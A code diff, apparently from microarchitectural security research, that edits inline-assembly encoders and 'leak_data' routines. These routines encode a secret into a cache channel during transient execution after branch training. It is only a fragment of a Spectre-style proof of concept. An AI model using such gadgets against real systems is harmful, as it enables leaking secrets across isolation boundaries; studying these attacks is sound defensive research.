@@ -46,11 +46,13 @@ static inline __always_inline void asm_encode_load_dynamic(
                      "movb $0x0, %%bl\n"
                      "movq %[stride], %%rdx\n"
                      "movq %[channel], %%r8\n"
-                     "movb %[n_a], %%dil\n"
+                     "movq $0x1, %%rdi\n"
                      "movb %[n_a], %%cl\n"
+                     "shl %%cl, %%dil\n"
+                     "subq $0x1, %%rdi\n"
                      "imulq %%rdx, %%rdi\n"
                      "movb %[n_b], %%sil\n"
-                     "imulq %%rdi, %%rsi\n"
+                     //"imulq %%rdi, %%rsi\n"
                      "enc69:\n"
 
                      "addb $0x1, %%bl\n"
@@ -133,10 +135,10 @@ static inline __always_inline void asm_encode_flush_bitwise(
 
 // returns true during the training phase, false if encoding can only happen transiently
 inline __always_inline bool leak_data(void (*asm_encode)(uint64_t data, uint8_t *channel,
-                                  uint8_t bits_count, uint64_t stride),
-               uint32_t iteration, uint32_t *train_data,
-               uint32_t train_data_len, uint64_t secret, uint8_t channel[],
-               uint8_t bits_count, uint64_t stride)
+                                                         uint8_t bits_count, uint64_t stride),
+                                      uint32_t iteration, uint32_t *train_data,
+                                      uint32_t train_data_len, uint64_t secret, uint8_t channel[],
+                                      uint8_t bits_count, uint64_t stride)
 {
     if (train_data[iteration] < train_data_len)
     {
@@ -147,14 +149,15 @@ inline __always_inline bool leak_data(void (*asm_encode)(uint64_t data, uint8_t 
 }
 
 // returns true during the training phase, false if encoding can only happen transiently
-static bool leak_data_dynamic(
-               uint32_t iteration, uint32_t *train_data,
-               uint32_t train_data_len, uint64_t secret, uint8_t channel[],
-               uint8_t n_b, uint8_t n_a, uint32_t bitmask, uint64_t stride)
+static bool leak_data_dynamic(void (*asm_encode)(uint64_t data, uint8_t *channel,
+                                                 uint8_t n_b, uint8_t n_a, uint64_t bitmask, uint64_t stride),
+                              uint32_t iteration, uint32_t *train_data,
+                              uint32_t train_data_len, uint64_t secret, uint8_t channel[],
+                              uint8_t n_b, uint8_t n_a, uint32_t bitmask, uint64_t stride)
 {
     if (train_data[iteration] < train_data_len)
     {
-        asm_encode_load_dynamic(secret, channel, n_b, n_a, bitmask, stride);
+        asm_encode(secret, channel, n_b, n_a, bitmask, stride);
         return true;
     }
     return false;
